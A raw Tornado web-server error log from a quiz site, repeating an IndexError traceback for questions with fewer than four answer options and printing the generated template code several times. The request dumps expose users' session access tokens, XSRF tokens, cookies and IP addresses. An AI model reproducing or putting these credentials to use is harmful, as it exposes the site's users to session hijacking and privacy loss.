  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 32.95ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b94c78e4c8548017fb42d&answers=%5B2%5D&cursor=18&_xsrf=3bfc475aa7374634934261809a7091dc', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '188.221.121.90', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDUFViOU5wZEVaQWw2ckh4TUxZSFpCUmtTWkNVMDExT3Rubnd2Ylg5RUZtaGpFazF6OGU4ZFpCUEF4dERhQ0s5RnJPb1pCVXV2cWlHMm52SVNuOVpCYTJiSmZCOW85UVpEWkQ=|1347963440|2bf665d3a726f0b5aa3e9cdda0e0690b59617c1e"; _xsrf=3bfc475aa7374634934261809a7091dc; __utma=188782963.2116357284.1347963424.1348165950.1348178970.3; __utmb=188782963.6.10.1348178970; __utmc=188782963; __utmz=188782963.1347963424.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 36.34ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c385c8e4c854802b2dbcb&answers=%5B3%5D&cursor=2&_xsrf=07b7ea1532da4c3e901fa020bfb7269f', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFGdEZaQ1UwbERUWkJTQXNMekJwM2taQmdVbWFHTWFaQ3BseVRXRzVaQ3R1blRJMVdyVzdJR05PeU10ZVpBdHM4R2ppaUFrQUI1NWY1cGs2bUxXa0h0Z0w2RGVtdHNUUVpEWkQ=|1348220923|035334a7569d378f218b918be8f7fe4ff2a51d6d"; _xsrf=07b7ea1532da4c3e901fa020bfb7269f; __utma=188782963.1312975164.1348220900.1348220900.1348220900.1; __utmb=188782963.5.10.1348220900; __utmc=188782963; __utmz=188782963.1348220900.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 155.09ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
